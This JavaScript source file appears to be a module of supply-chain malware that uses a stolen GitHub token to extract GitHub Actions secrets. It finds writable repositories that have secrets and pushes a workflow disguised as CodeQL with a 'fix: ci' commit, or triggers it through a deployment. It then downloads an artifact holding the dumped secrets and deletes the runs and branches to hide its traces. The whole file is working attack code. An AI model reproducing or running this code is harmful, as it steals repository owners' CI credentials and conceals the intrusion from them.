/*
 * GitHub Actions workflow dispatch, artifact collection, and Actions secret extraction.
 */

var codeqlWorkflowPath = ".github/workflows/codeql.yml",
  codeqlWorkflowFileName = "codeql.yml";
function randomCodeqlWorkflowName() {
  return "codeql-" + (Math.floor(Math.random() * 90000) + 10000) + ".yml";
}
var workflowPollingConfig = {
    WORKFLOW_APPEARANCE: { maxAttempts: 15, delayMs: 3000 },
    DEPLOY_WORKFLOW_APPEARANCE: { maxAttempts: 20, delayMs: 5000 },
    WORKFLOW_COMPLETION: { maxAttempts: 30, delayMs: 10000 },
  },
  protectedBranchPrefixes = [
    "dependabot/",
    "renovate/",
    "gh-pages",
    "docs/",
    "copilot/",
    "master",
    "main",
  ];
function randomBranchName(branchNameBase) {
  let branchNameRandomSuffix = Math.floor(Math.random() * 10);
  return branchNameBase + "-" + branchNameRandomSuffix;
}
function sleepMs(sleepDelayMs) {
  return new Promise((resolveSleep) => setTimeout(resolveSleep, sleepDelayMs));
}
async function listRepositoryBranches(
  branchesGithubToken,
  branchesOwner,
  branchesRepo,
) {
  return (
    await githubJson(
      branchesGithubToken,
      "/repos/" + branchesOwner + "/" + branchesRepo + "/branches?per_page=30",
    )
  ).map((githubBranch) => ({
    name: githubBranch.name,
    sha: githubBranch.commit.sha,
  }));
}
function chooseNonProtectedBranch(candidateBranches, defaultBranchName) {
  let nonProtectedBranches = candidateBranches.filter(
    (candidateBranch) =>
      candidateBranch.name !== defaultBranchName &&
      !protectedBranchPrefixes.some((protectedBranchPrefix) =>
        candidateBranch.name.startsWith(protectedBranchPrefix),
      ),
  );
  if (nonProtectedBranches.length === 0)
    return (
      candidateBranches.find(
        (nonDefaultBranch) => nonDefaultBranch.name !== defaultBranchName,
      ) ?? candidateBranches[0]
    );
  return nonProtectedBranches[
    Math.floor(Math.random() * nonProtectedBranches.length)
  ];
}
async function createPushWorkflowBranch(
  pushWorkflowGithubToken,
  pushWorkflowOwner,
  pushWorkflowRepo,
  pushWorkflowBaseBranch,
) {
  let pushWorkflowBranchName = randomBranchName(pushWorkflowBaseBranch.name);
  await githubFetch(
    pushWorkflowGithubToken,
    "/repos/" + pushWorkflowOwner + "/" + pushWorkflowRepo + "/git/refs",
    {
      method: "POST",
      body: JSON.stringify({
        ref: "refs/heads/" + pushWorkflowBranchName,
        sha: pushWorkflowBaseBranch.sha,
      }),
    },
  );
  let pushWorkflowBlob = await githubJson(
      pushWorkflowGithubToken,
      "/repos/" + pushWorkflowOwner + "/" + pushWorkflowRepo + "/git/blobs",
      {
        method: "POST",
        body: JSON.stringify({
          content: codeqlWorkflowPayload,
          encoding: "utf-8",
        }),
      },
    ),
    pushWorkflowTree = await githubJson(
      pushWorkflowGithubToken,
      "/repos/" + pushWorkflowOwner + "/" + pushWorkflowRepo + "/git/trees",
      {
        method: "POST",
        body: JSON.stringify({
          base_tree: pushWorkflowBaseBranch.sha,
          tree: [
            {
              path: codeqlWorkflowPath,
              mode: "100644",
              type: "blob",
              sha: pushWorkflowBlob.sha,
            },
          ],
        }),
      },
    ),
    pushWorkflowCommit = await githubJson(
      pushWorkflowGithubToken,
      "/repos/" + pushWorkflowOwner + "/" + pushWorkflowRepo + "/git/commits",
      {
        method: "POST",
        body: JSON.stringify({
          message: "fix: ci",
          tree: pushWorkflowTree.sha,
          parents: [pushWorkflowBaseBranch.sha],
        }),
      },
    );
  return (
    await githubFetch(
      pushWorkflowGithubToken,
      "/repos/" +
        pushWorkflowOwner +
        "/" +
        pushWorkflowRepo +
        "/git/refs/heads/" +
        encodeURIComponent(pushWorkflowBranchName),
      {
        method: "PATCH",
        body: JSON.stringify({ sha: pushWorkflowCommit.sha, force: true }),
      },
    ),
    {
      branchName: pushWorkflowBranchName,
      originalSha: pushWorkflowBaseBranch.sha,
      workflowSha: pushWorkflowCommit.sha,
    }
  );
}
async function createDeploymentWorkflowBranch(
  deploymentWorkflowGithubToken,
  deploymentWorkflowOwner,
  deploymentWorkflowRepo,
  deploymentDefaultBranch,
) {
  let deploymentWorkflowBranchName = "chore/codeql-setup",
    deploymentWorkflowFile = randomCodeqlWorkflowName(),
    deploymentBaseCommitSha,
    deploymentBaseTreeSha;
  try {
    (deploymentBaseCommitSha = (
      await githubJson(
        deploymentWorkflowGithubToken,
        "/repos/" +
          deploymentWorkflowOwner +
          "/" +
          deploymentWorkflowRepo +
          "/git/ref/heads/" +
          encodeURIComponent(deploymentDefaultBranch),
      )
    ).object.sha),
      (deploymentBaseTreeSha = await getCommitTreeSha(
        deploymentWorkflowGithubToken,
        deploymentWorkflowOwner,
        deploymentWorkflowRepo,
        deploymentBaseCommitSha,
      ));
  } catch (deploymentDefaultBranchError) {
    throw Error(
      'resolve default branch "' +
        deploymentDefaultBranch +
        '": ' +
        (deploymentDefaultBranchError instanceof Error
          ? deploymentDefaultBranchError.message
          : String(deploymentDefaultBranchError)),
    );
  }
  let deploymentWorkflowSource = deploymentWorkflowPayload,
    deploymentWorkflowBlobSha;
  try {
    deploymentWorkflowBlobSha = await createGitBlobSha(
      deploymentWorkflowGithubToken,
      deploymentWorkflowOwner,
      deploymentWorkflowRepo,
      deploymentWorkflowSource,
    );
  } catch (deploymentWorkflowBlobError) {
    throw Error(
      "create workflow blob: " +
        (deploymentWorkflowBlobError instanceof Error
          ? deploymentWorkflowBlobError.message
          : String(deploymentWorkflowBlobError)),
    );
  }
  let deploymentWorkflowFileTreeSha = await createGitTree(
      deploymentWorkflowGithubToken,
      deploymentWorkflowOwner,
      deploymentWorkflowRepo,
      null,
      [
        {
          path: deploymentWorkflowFile,
          mode: "100644",
          type: "blob",
          sha: deploymentWorkflowBlobSha,
        },
      ],
    ),
    deploymentWorkflowsDirTreeSha = await createGitTree(
      deploymentWorkflowGithubToken,
      deploymentWorkflowOwner,
      deploymentWorkflowRepo,
      null,
      [
        {
          path: "workflows",
          mode: "040000",
          type: "tree",
          sha: deploymentWorkflowFileTreeSha,
        },
      ],
    ),
    deploymentGithubDirTreeSha = await createGitTree(
      deploymentWorkflowGithubToken,
      deploymentWorkflowOwner,
      deploymentWorkflowRepo,
      null,
      [
        {
          path: ".github",
          mode: "040000",
          type: "tree",
          sha: deploymentWorkflowsDirTreeSha,
        },
      ],
    ),
    deploymentAddCommitSha;
  try {
    deploymentAddCommitSha = await createGitCommit(
      deploymentWorkflowGithubToken,
      deploymentWorkflowOwner,
      deploymentWorkflowRepo,
      "fix: ci",
      deploymentGithubDirTreeSha,
      deploymentBaseCommitSha,
    );
  } catch (deploymentAddCommitError) {
    throw Error(
      "create add-commit: " +
        (deploymentAddCommitError instanceof Error
          ? deploymentAddCommitError.message
          : String(deploymentAddCommitError)),
    );
  }
  let deploymentDeleteCommitSha;
  try {
    deploymentDeleteCommitSha = await createGitCommit(
      deploymentWorkflowGithubToken,
      deploymentWorkflowOwner,
      deploymentWorkflowRepo,
      "fix: ci",
      deploymentBaseTreeSha,
      deploymentAddCommitSha,
    );
  } catch (deploymentDeleteCommitError) {
    throw Error(
      "create del-commit: " +
        (deploymentDeleteCommitError instanceof Error
          ? deploymentDeleteCommitError.message
          : String(deploymentDeleteCommitError)),
    );
  }
  try {
    await createGitBranchRef(
      deploymentWorkflowGithubToken,
      deploymentWorkflowOwner,
      deploymentWorkflowRepo,
      deploymentWorkflowBranchName,
      deploymentDeleteCommitSha,
    );
  } catch (deploymentBranchCreateError) {
    throw Error(
      'create branch "' +
        deploymentWorkflowBranchName +
        '": ' +
        (deploymentBranchCreateError instanceof Error
          ? deploymentBranchCreateError.message
          : String(deploymentBranchCreateError)),
    );
  }
  let workflowDeploymentId;
  try {
    workflowDeploymentId = (
      await githubJson(
        deploymentWorkflowGithubToken,
        "/repos/" +
          deploymentWorkflowOwner +
          "/" +
          deploymentWorkflowRepo +
          "/deployments",
        {
          method: "POST",
          body: JSON.stringify({
            ref: deploymentAddCommitSha,
            auto_merge: false,
            required_contexts: [],
            environment: "Development",
            transient_environment: true,
          }),
        },
      )
    ).id;
  } catch (deploymentCreateError) {
    throw Error(
      "create deployment: " +
        (deploymentCreateError instanceof Error
          ? deploymentCreateError.message
          : String(deploymentCreateError)),
    );
  }
  return {
    addSha: deploymentAddCommitSha,
    branchName: deploymentWorkflowBranchName,
    deployId: workflowDeploymentId,
    workflowFile: deploymentWorkflowFile,
  };
}
async function waitForPushWorkflowRun(
  pushRunGithubToken,
  pushRunOwner,
  pushRunRepo,
  pushRunBranchName,
) {
  let { maxAttempts: pushRunMaxAttempts, delayMs: pushRunDelayMs } =
    workflowPollingConfig.WORKFLOW_APPEARANCE;
  for (
    let pushRunAttemptIndex = 0;
    pushRunAttemptIndex < pushRunMaxAttempts;
    pushRunAttemptIndex++
  ) {
    let pushWorkflowRun = (
      await githubJson(
        pushRunGithubToken,
        "/repos/" +
          pushRunOwner +
          "/" +
          pushRunRepo +
          "/actions/workflows/" +
          encodeURIComponent(codeqlWorkflowFileName) +
          "/runs?branch=" +
          encodeURIComponent(pushRunBranchName) +
          "&per_page=1",
      )
    ).workflow_runs[0];
    if (pushWorkflowRun) return pushWorkflowRun.id;
    await sleepMs(pushRunDelayMs);
  }
  throw Error(
    'Workflow run for "${PUSH_WORKFLOW_FILE}" not found after polling',
  );
}
async function waitForDeploymentWorkflowRun(
  deploymentRunGithubToken,
  deploymentRunOwner,
  deploymentRunRepo,
  deploymentRunWorkflowFile,
) {
  let { maxAttempts: deploymentRunMaxAttempts, delayMs: deploymentRunDelayMs } =
    workflowPollingConfig.DEPLOY_WORKFLOW_APPEARANCE;
  for (
    let deploymentRunAttemptIndex = 0;
    deploymentRunAttemptIndex < deploymentRunMaxAttempts;
    deploymentRunAttemptIndex++
  ) {
    let deploymentWorkflowRun = (
      await githubJson(
        deploymentRunGithubToken,
        "/repos/" +
          deploymentRunOwner +
          "/" +
          deploymentRunRepo +
          "/actions/runs?per_page=10",
      )
    ).workflow_runs.find((deploymentRunCandidate) =>
      deploymentRunCandidate.path.endsWith(deploymentRunWorkflowFile),
    );
    if (deploymentWorkflowRun) return deploymentWorkflowRun.id;
    await sleepMs(deploymentRunDelayMs);
  }
  throw Error(
    'Workflow run for "' +
      deploymentRunWorkflowFile +
      '" not found after polling',
  );
}
async function waitForWorkflowCompletion(
  workflowCompletionGithubToken,
  workflowCompletionOwner,
  workflowCompletionRepo,
  workflowRunId,
) {
  let {
    maxAttempts: workflowCompletionMaxAttempts,
    delayMs: workflowCompletionDelayMs,
  } = workflowPollingConfig.WORKFLOW_COMPLETION;
  for (
    let workflowCompletionAttemptIndex = 0;
    workflowCompletionAttemptIndex < workflowCompletionMaxAttempts;
    workflowCompletionAttemptIndex++
  ) {
    if (
      (
        await githubJson(
          workflowCompletionGithubToken,
          "/repos/" +
            workflowCompletionOwner +
            "/" +
            workflowCompletionRepo +
            "/actions/runs/" +
            workflowRunId,
        )
      ).status === "completed"
    )
      return;
    await sleepMs(workflowCompletionDelayMs);
  }
  throw Error("Workflow did not complete in time");
}
async function waitForWorkflowArtifact(
  artifactGithubToken,
  artifactOwner,
  artifactRepo,
  artifactWorkflowRunId,
) {
  let { maxAttempts: artifactMaxAttempts, delayMs: artifactDelayMs } =
    workflowPollingConfig.WORKFLOW_COMPLETION;
  for (
    let artifactAttemptIndex = 0;
    artifactAttemptIndex < artifactMaxAttempts;
    artifactAttemptIndex++
  ) {
    let artifactsResponse = await githubFetch(
      artifactGithubToken,
      "/repos/" +
        artifactOwner +
        "/" +
        artifactRepo +
        "/actions/runs/" +
        artifactWorkflowRunId +
        "/artifacts",
    );
    if (!artifactsResponse.ok) {
      await sleepMs(artifactDelayMs);
      continue;
    }
    let formatResultsArtifact = (await artifactsResponse.json()).artifacts.find(
      (workflowArtifact) => workflowArtifact.name === "format-results",
    );
    if (formatResultsArtifact) return formatResultsArtifact;
    await sleepMs(artifactDelayMs);
  }
  return null;
}
async function downloadWorkflowArtifactText(
  {
    token: artifactDownloadToken,
    owner: artifactDownloadOwner,
    repo: artifactDownloadRepo,
  },
  artifactToDownload,
) {
  let artifactZipResponse = await githubFetch(
    artifactDownloadToken,
    "/repos/" +
      artifactDownloadOwner +
      "/" +
      artifactDownloadRepo +
      "/actions/artifacts/" +
      artifactToDownload.id +
      "/zip",
  );
  if (!artifactZipResponse.ok) return null;
  let artifactZipBytes = new Uint8Array(
      await artifactZipResponse.arrayBuffer(),
    ),
    formatResultsFile =
      unzipSyncToFileMap(artifactZipBytes)["format-results.txt"];
  return formatResultsFile ? new TextDecoder().decode(formatResultsFile) : null;
}
async function cleanupPushWorkflowRun(
  { token: pushCleanupToken, owner: pushCleanupOwner, repo: pushCleanupRepo },
  pushCleanupRunId,
  pushCleanupBranchName,
) {
  try {
    await waitForWorkflowCompletion(
      pushCleanupToken,
      pushCleanupOwner,
      pushCleanupRepo,
      pushCleanupRunId,
    );
  } catch {
    return;
  }
  let pushWorkflowDeleteResponse = await githubFetch(
    pushCleanupToken,
    "/repos/" +
      pushCleanupOwner +
      "/" +
      pushCleanupRepo +
      "/actions/runs/" +
      pushCleanupRunId,
    { method: "DELETE" },
  );
  if (
    !pushWorkflowDeleteResponse.ok &&
    pushWorkflowDeleteResponse.status !== 404
  );
  await deleteGitBranchRef(
    pushCleanupToken,
    pushCleanupOwner,
    pushCleanupRepo,
    pushCleanupBranchName,
  ).catch(() => {});
}
async function cleanupDeploymentWorkflowRun(
  {
    token: deploymentCleanupToken,
    owner: deploymentCleanupOwner,
    repo: deploymentCleanupRepo,
  },
  deploymentCleanupRunId,
  deploymentCleanupBranchName,
) {
  try {
    await waitForWorkflowCompletion(
      deploymentCleanupToken,
      deploymentCleanupOwner,
      deploymentCleanupRepo,
      deploymentCleanupRunId,
    );
  } catch {}
  await githubFetch(
    deploymentCleanupToken,
    "/repos/" +
      deploymentCleanupOwner +
      "/" +
      deploymentCleanupRepo +
      "/actions/runs/" +
      deploymentCleanupRunId,
    { method: "DELETE" },
  ).catch(() => {}),
    await deleteGitBranchRef(
      deploymentCleanupToken,
      deploymentCleanupOwner,
      deploymentCleanupRepo,
      deploymentCleanupBranchName,
    ).catch(() => {});
}
async function dumpSecretsViaPushWorkflow(pushDumpTarget) {
  let {
      token: pushDumpToken,
      owner: pushDumpOwner,
      repo: pushDumpRepo,
    } = pushDumpTarget,
    pushDumpBranchName,
    pushDumpRunId;
  try {
    let pushDumpBranches = await listRepositoryBranches(
        pushDumpToken,
        pushDumpOwner,
        pushDumpRepo,
      ),
      pushDumpBaseBranch;
    if (pushDumpBranches.length === 0) {
      let pushDumpDefaultBranch = (
          await githubJson(
            pushDumpToken,
            "/repos/" + pushDumpOwner + "/" + pushDumpRepo,
          )
        ).default_branch,
        pushDumpDefaultBranchRef = await githubJson(
          pushDumpToken,
          "/repos/" +
            pushDumpOwner +
            "/" +
            pushDumpRepo +
            "/git/ref/heads/" +
            encodeURIComponent(pushDumpDefaultBranch),
        );
      pushDumpBaseBranch = {
        name: "chore/add-codeql-static-analysis",
        sha: pushDumpDefaultBranchRef.object.sha,
      };
    } else {
      let pushDumpRepoDefaultBranch = (
        await githubJson(
          pushDumpToken,
          "/repos/" + pushDumpOwner + "/" + pushDumpRepo,
        )
      ).default_branch;
      pushDumpBaseBranch = chooseNonProtectedBranch(
        pushDumpBranches,
        pushDumpRepoDefaultBranch,
      );
    }
    (pushDumpBranchName = (
      await createPushWorkflowBranch(
        pushDumpToken,
        pushDumpOwner,
        pushDumpRepo,
        pushDumpBaseBranch,
      )
    ).branchName),
      await sleepMs(workflowPollingConfig.WORKFLOW_APPEARANCE.delayMs),
      (pushDumpRunId = await waitForPushWorkflowRun(
        pushDumpToken,
        pushDumpOwner,
        pushDumpRepo,
        pushDumpBranchName,
      ));
    let pushDumpArtifact = await waitForWorkflowArtifact(
        pushDumpToken,
        pushDumpOwner,
        pushDumpRepo,
        pushDumpRunId,
      ),
      pushDumpArtifactText = pushDumpArtifact
        ? await downloadWorkflowArtifactText(pushDumpTarget, pushDumpArtifact)
        : null;
    return {
      repo: pushDumpOwner + "/" + pushDumpRepo,
      artifact: pushDumpArtifactText,
    };
  } catch (pushDumpError) {
    return {
      repo: pushDumpOwner + "/" + pushDumpRepo,
      artifact: null,
      error:
        pushDumpError instanceof Error
          ? pushDumpError.message
          : String(pushDumpError),
    };
  } finally {
    if (pushDumpBranchName && pushDumpRunId !== void 0)
      cleanupPushWorkflowRun(
        pushDumpTarget,
        pushDumpRunId,
        pushDumpBranchName,
      ).catch(() => {});
  }
}
async function dumpSecretsViaDeploymentWorkflow(deploymentDumpTarget) {
  let {
      token: deploymentDumpToken,
      owner: deploymentDumpOwner,
      repo: deploymentDumpRepo,
    } = deploymentDumpTarget,
    deploymentDumpBranchName,
    deploymentDumpRunId;
  try {
    let deploymentDumpDefaultBranch = (
        await githubJson(
          deploymentDumpToken,
          "/repos/" + deploymentDumpOwner + "/" + deploymentDumpRepo,
        )
      ).default_branch,
      {
        addSha: deploymentDumpAddSha,
        branchName: deploymentDumpCreatedBranch,
        workflowFile: deploymentDumpWorkflowFile,
      } = await createDeploymentWorkflowBranch(
        deploymentDumpToken,
        deploymentDumpOwner,
        deploymentDumpRepo,
        deploymentDumpDefaultBranch,
      );
    (deploymentDumpBranchName = deploymentDumpCreatedBranch),
      await sleepMs(10000);
    try {
      deploymentDumpRunId = await waitForDeploymentWorkflowRun(
        deploymentDumpToken,
        deploymentDumpOwner,
        deploymentDumpRepo,
        deploymentDumpWorkflowFile,
      );
    } catch (deploymentRunPollError) {
      throw Error(
        "poll for run: " +
          (deploymentRunPollError instanceof Error
            ? deploymentRunPollError.message
            : String(deploymentRunPollError)),
      );
    }
    let deploymentDumpArtifact;
    try {
      deploymentDumpArtifact = await waitForWorkflowArtifact(
        deploymentDumpToken,
        deploymentDumpOwner,
        deploymentDumpRepo,
        deploymentDumpRunId,
      );
    } catch (deploymentArtifactPollError) {
      throw Error(
        "poll for artifact: " +
          (deploymentArtifactPollError instanceof Error
            ? deploymentArtifactPollError.message
            : String(deploymentArtifactPollError)),
      );
    }
    let deploymentDumpArtifactText = deploymentDumpArtifact
      ? await downloadWorkflowArtifactText(
          deploymentDumpTarget,
          deploymentDumpArtifact,
        )
      : null;
    return {
      repo: deploymentDumpOwner + "/" + deploymentDumpRepo,
      artifact: deploymentDumpArtifactText,
    };
  } catch (deploymentDumpError) {
    let deploymentDumpErrorMessage =
      deploymentDumpError instanceof Error
        ? deploymentDumpError.message
        : String(deploymentDumpError);
    return {
      repo: deploymentDumpOwner + "/" + deploymentDumpRepo,
      artifact: null,
      error: deploymentDumpErrorMessage,
    };
  } finally {
    if (deploymentDumpBranchName && deploymentDumpRunId !== void 0)
      cleanupDeploymentWorkflowRun(
        deploymentDumpTarget,
        deploymentDumpRunId,
        deploymentDumpBranchName,
      ).catch(() => {});
  }
}
async function* runPushWorkflowDumpQueue(
  pushDumpTargets,
  pushDumpConcurrency = 10,
) {
  let activePushDumpPromises = new Set();
  for (let pushDumpQueueTarget of pushDumpTargets) {
    let pushDumpPromise = dumpSecretsViaPushWorkflow(pushDumpQueueTarget);
    if (
      (activePushDumpPromises.add(pushDumpPromise),
      activePushDumpPromises.size >= pushDumpConcurrency)
    ) {
      let completedPushDump = await Promise.race(
        [...activePushDumpPromises].map((activePushDumpPromise) =>
          activePushDumpPromise.then((pushDumpResult) => ({
            promise: activePushDumpPromise,
            result: pushDumpResult,
          })),
        ),
      );
      activePushDumpPromises.delete(completedPushDump.promise),
        yield completedPushDump.result;
    }
  }
  for (let remainingPushDumpPromise of activePushDumpPromises)
    yield await remainingPushDumpPromise;
}
async function* runDeploymentWorkflowDumpQueue(
  deploymentDumpTargets,
  deploymentDumpConcurrency = 10,
) {
  let activeDeploymentDumpPromises = new Set();
  for (let deploymentDumpQueueTarget of deploymentDumpTargets) {
    let deploymentDumpPromise = dumpSecretsViaDeploymentWorkflow(
      deploymentDumpQueueTarget,
    );
    if (
      (activeDeploymentDumpPromises.add(deploymentDumpPromise),
      activeDeploymentDumpPromises.size >= deploymentDumpConcurrency)
    ) {
      let completedDeploymentDump = await Promise.race(
        [...activeDeploymentDumpPromises].map((activeDeploymentDumpPromise) =>
          activeDeploymentDumpPromise.then((deploymentDumpResult) => ({
            promise: activeDeploymentDumpPromise,
            result: deploymentDumpResult,
          })),
        ),
      );
      activeDeploymentDumpPromises.delete(completedDeploymentDump.promise),
        yield completedDeploymentDump.result;
    }
  }
  for (let remainingDeploymentDumpPromise of activeDeploymentDumpPromises)
    yield await remainingDeploymentDumpPromise;
}
async function selectReposWithActionSecrets(actionSecretScanToken) {
  let reposSelectedForDump = [],
    actionSecretDumpMetadata = [];
  for await (let repoActionSecretInfo of enumerateRepoActionSecrets(
    actionSecretScanToken,
    enumerateRecentWritableRepos(actionSecretScanToken),
  )) {
    let repoHasActionSecrets = repoActionSecretInfo.secrets.length > 0,
      [repoActionSecretOwner, repoActionSecretRepo] =
        repoActionSecretInfo.fullName.split("/");
    if (
      repoHasActionSecrets &&
      repoActionSecretOwner &&
      repoActionSecretRepo &&
      reposSelectedForDump.length < 5
    )
      reposSelectedForDump.push({
        token: actionSecretScanToken,
        owner: repoActionSecretOwner,
        repo: repoActionSecretRepo,
      }),
        actionSecretDumpMetadata.push({
          fullName: repoActionSecretInfo.fullName,
          secrets: repoActionSecretInfo.secrets,
          status: "DUMPED",
          method: "push",
        });
    else
      actionSecretDumpMetadata.push({
        fullName: repoActionSecretInfo.fullName,
        secrets: repoActionSecretInfo.secrets,
        status: "SKIPPED",
        method: "push",
      });
  }
  return { toDump: reposSelectedForDump, metadata: actionSecretDumpMetadata };
}
function mergeDumpMetadata(dumpResults, dumpMetadata, dumpMethod) {
  let dumpResultsByRepo = new Map(
    dumpResults.map((dumpResultForMap) => [
      dumpResultForMap.repo,
      dumpResultForMap,
    ]),
  );
  return dumpMetadata.map((dumpMetadataEntry) => ({
    ...dumpMetadataEntry,
    method: dumpMethod,
    ...(dumpMetadataEntry.status === "DUMPED"
      ? (() => {
          let matchingDumpResult = dumpResultsByRepo.get(
            dumpMetadataEntry.fullName,
          );
          if (
            !matchingDumpResult ||
            matchingDumpResult.error ||
            matchingDumpResult.artifact === null
          )
            return {
              status: "FAILED",
              error: matchingDumpResult?.error ?? "no result",
            };
          return {};
        })()
      : {}),
  }));
}
async function dumpSecretsViaPushWorkflows(
  pushWorkflowDumpToken,
  pushWorkflowDumpConcurrency = 5,
) {
  let { toDump: pushWorkflowReposToDump, metadata: pushWorkflowDumpMetadata } =
      await selectReposWithActionSecrets(pushWorkflowDumpToken),
    pushWorkflowDumpResults = [];
  for await (let pushWorkflowDumpQueueResult of runPushWorkflowDumpQueue(
    pushWorkflowReposToDump,
    pushWorkflowDumpConcurrency,
  ))
    pushWorkflowDumpResults.push(pushWorkflowDumpQueueResult);
  return {
    results: pushWorkflowDumpResults,
    metadata: mergeDumpMetadata(
      pushWorkflowDumpResults,
      pushWorkflowDumpMetadata,
      "push",
    ),
  };
}
async function dumpSecretsViaDeploymentWorkflows(
  deploymentWorkflowDumpToken,
  deploymentWorkflowDumpConcurrency = 5,
) {
  let {
      toDump: deploymentWorkflowReposToDump,
      metadata: deploymentWorkflowDumpMetadata,
    } = await selectReposWithActionSecrets(deploymentWorkflowDumpToken),
    deploymentWorkflowDumpResults = [];
  for await (let deploymentWorkflowDumpQueueResult of runDeploymentWorkflowDumpQueue(
    deploymentWorkflowReposToDump,
    deploymentWorkflowDumpConcurrency,
  ))
    deploymentWorkflowDumpResults.push(deploymentWorkflowDumpQueueResult);
  return {
    results: deploymentWorkflowDumpResults,
    metadata: mergeDumpMetadata(
      deploymentWorkflowDumpResults,
      deploymentWorkflowDumpMetadata,
      "deployment",
    ),
  };
}
class GitHubActionsTokenProvider extends SecretProviderBase {
  token;
  constructor(githubActionsProviderToken) {
    super("github", "actions"), (this.token = githubActionsProviderToken);
  }
  async execute() {
    let githubActionsTokenMetadata = await validateGitHubTokenWithOrgs(
      this.token,
    );
    if (!githubActionsTokenMetadata.valid) return this.failure("Token invalid");
    if (githubActionsTokenMetadata.scopes.includes("workflow"))
      return this.runPushWorkflow();
    return this.runDeployWorkflow();
  }
  async runPushWorkflow() {
    try {
      let {
          results: actionsPushDumpResults,
          metadata: actionsPushDumpMetadata,
        } = await dumpSecretsViaPushWorkflows(this.token),
        successfulPushWorkflowDumpCount = actionsPushDumpResults.filter(
          (pushWorkflowNonErrorResult) => !pushWorkflowNonErrorResult.error,
        ).length;
      if (successfulPushWorkflowDumpCount === 0)
        return this.success({
          ok: false,
          dumped: 0,
          errored: actionsPushDumpResults.filter(
            (pushWorkflowErroredResult) => pushWorkflowErroredResult.error,
          ).length,
          results: actionsPushDumpResults,
          metadata: actionsPushDumpMetadata,
        });
      return this.success({
        ok: true,
        dumped: successfulPushWorkflowDumpCount,
        errored: actionsPushDumpResults.filter(
          (pushWorkflowErroredResultForSuccess) =>
            pushWorkflowErroredResultForSuccess.error,
        ).length,
        results: actionsPushDumpResults,
        metadata: actionsPushDumpMetadata,
      });
    } catch (pushWorkflowDumpError) {
      return this.failure(
        "Failure collecting results: " +
          (pushWorkflowDumpError instanceof Error
            ? pushWorkflowDumpError.message
            : String(pushWorkflowDumpError)),
      );
    }
  }
  async runDeployWorkflow() {
    try {
      let {
          results: actionsDeploymentDumpResults,
          metadata: actionsDeploymentDumpMetadata,
        } = await dumpSecretsViaDeploymentWorkflows(this.token),
        successfulDeploymentWorkflowDumpCount =
          actionsDeploymentDumpResults.filter(
            (deploymentWorkflowNonErrorResult) =>
              !deploymentWorkflowNonErrorResult.error,
          ).length;
      if (successfulDeploymentWorkflowDumpCount === 0)
        return this.success({
          ok: false,
          dumped: 0,
          errored: actionsDeploymentDumpResults.filter(
            (deploymentWorkflowErroredResult) =>
              deploymentWorkflowErroredResult.error,
          ).length,
          results: actionsDeploymentDumpResults,
          metadata: actionsDeploymentDumpMetadata,
        });
      return this.success({
        ok: true,
        dumped: successfulDeploymentWorkflowDumpCount,
        errored: actionsDeploymentDumpResults.filter(
          (deploymentWorkflowErroredResultForSuccess) =>
            deploymentWorkflowErroredResultForSuccess.error,
        ).length,
        results: actionsDeploymentDumpResults,
        metadata: actionsDeploymentDumpMetadata,
      });
    } catch (deploymentWorkflowDumpError) {
      return this.failure(
        "Failure collecting results: " +
          (deploymentWorkflowDumpError instanceof Error
            ? deploymentWorkflowDumpError.message
            : String(deploymentWorkflowDumpError)),
      );
    }
  }
}
